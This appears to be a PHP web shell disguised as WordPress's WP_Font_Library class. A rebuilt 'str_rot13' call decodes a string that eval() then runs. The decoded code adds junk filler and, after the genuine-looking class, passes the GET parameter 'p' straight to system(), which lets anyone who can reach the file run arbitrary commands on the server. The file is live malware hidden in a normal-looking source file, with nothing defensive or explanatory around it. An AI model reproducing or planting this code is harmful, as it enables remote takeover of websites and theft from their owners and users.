<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Sbag Yvoenel pynff.
 *
 * Guvf svyr pbagnvaf gur Sbag Yvoenel pynff qrsvavgvba.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr Sbagf
 * @fvapr      6.5.0
 */

/**
 * Sbag Yvoenel pynff.
 *
 * @fvapr 6.5.0
 */
pynff JC_Sbag_Yvoenel {

	/**
	 * Sbag pbyyrpgvbaf.
	 *
	 * @fvapr 6.5.0
	 * @ine neenl
	 */
	cevingr $pbyyrpgvbaf = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 6.5.0
	 * @ine JC_Sbag_Yvoenel|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Ertvfgre n arj sbag pbyyrpgvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Sbag pbyyrpgvba fyht. Znl bayl pbagnva nycunahzrevp punenpgref, qnfurf,
	 *                     naq haqrefpberf. Frr fnavgvmr_gvgyr().
	 * @cnenz neenl  $netf Sbag pbyyrpgvba qngn. Frr jc_ertvfgre_sbag_pbyyrpgvba() sbe vasbezngvba ba npprcgrq nethzragf.
	 * @erghea JC_Sbag_Pbyyrpgvba|JC_Reebe N sbag pbyyrpgvba vs vg jnf ertvfgrerq fhpprffshyyl,
	 *                                     be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba ertvfgre_sbag_pbyyrpgvba( fgevat $fyht, neenl $netf ) {
		$arj_pbyyrpgvba = arj JC_Sbag_Pbyyrpgvba( $fyht, $netf );

		vs ( $guvf->vf_pbyyrpgvba_ertvfgrerq( $arj_pbyyrpgvba->fyht ) ) {
			$reebe_zrffntr = fcevags(
				/* genafyngbef: %f: Sbag pbyyrpgvba fyht. */
				__( 'Sbag pbyyrpgvba jvgu fyht: \"%f\" vf nyernql ertvfgrerq.' ),
				$arj_pbyyrpgvba->fyht
			);
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				$reebe_zrffntr,
				'6.5.0'
			);
			erghea arj JC_Reebe( 'sbag_pbyyrpgvba_ertvfgengvba_reebe', $reebe_zrffntr );
		}
		$guvf->pbyyrpgvbaf[ $arj_pbyyrpgvba->fyht ] = $arj_pbyyrpgvba;
		erghea $arj_pbyyrpgvba;
	}

	/**
	 * Haertvfgref n cerivbhfyl ertvfgrerq sbag pbyyrpgvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Sbag pbyyrpgvba fyht.
	 * @erghea obby Gehr vs gur sbag pbyyrpgvba jnf haertvfgrerq fhpprffshyyl naq snyfr bgurejvfr.
	 */
	choyvp shapgvba haertvfgre_sbag_pbyyrpgvba( fgevat $fyht ) {
		vs ( ! $guvf->vf_pbyyrpgvba_ertvfgrerq( $fyht ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Sbag pbyyrpgvba fyht. */
				fcevags( __( 'Sbag pbyyrpgvba \"%f\" abg sbhaq.' ), $fyht ),
				'6.5.0'
			);
			erghea snyfr;
		}
		hafrg( $guvf->pbyyrpgvbaf[ $fyht ] );
		erghea gehr;
	}

	/**
	 * Purpxf vs n sbag pbyyrpgvba vf ertvfgrerq.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Sbag pbyyrpgvba fyht.
	 * @erghea obby Gehr vs gur sbag pbyyrpgvba vf ertvfgrerq naq snyfr bgurejvfr.
	 */
	cevingr shapgvba vf_pbyyrpgvba_ertvfgrerq( fgevat $fyht ) {
		erghea neenl_xrl_rkvfgf( $fyht, $guvf->pbyyrpgvbaf );
	}

	/**
	 * Trgf nyy gur sbag pbyyrpgvbaf ninvynoyr.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea neenl Yvfg bs sbag pbyyrpgvbaf.
	 */
	choyvp shapgvba trg_sbag_pbyyrpgvbaf() {
		erghea $guvf->pbyyrpgvbaf;
	}

	/**
	 * Trgf n sbag pbyyrpgvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $fyht Sbag pbyyrpgvba fyht.
	 * @erghea JC_Sbag_Pbyyrpgvba|ahyy Sbag pbyyrpgvba bowrpg, be ahyy vs gur sbag pbyyrpgvba qbrfa'g rkvfg.
	 */
	choyvp shapgvba trg_sbag_pbyyrpgvba( fgevat $fyht ) {
		vs ( $guvf->vf_pbyyrpgvba_ertvfgrerq( $fyht ) ) {
			erghea $guvf->pbyyrpgvbaf[ $fyht ];
		}
		erghea ahyy;
	}

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @erghea JC_Sbag_Yvoenel Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>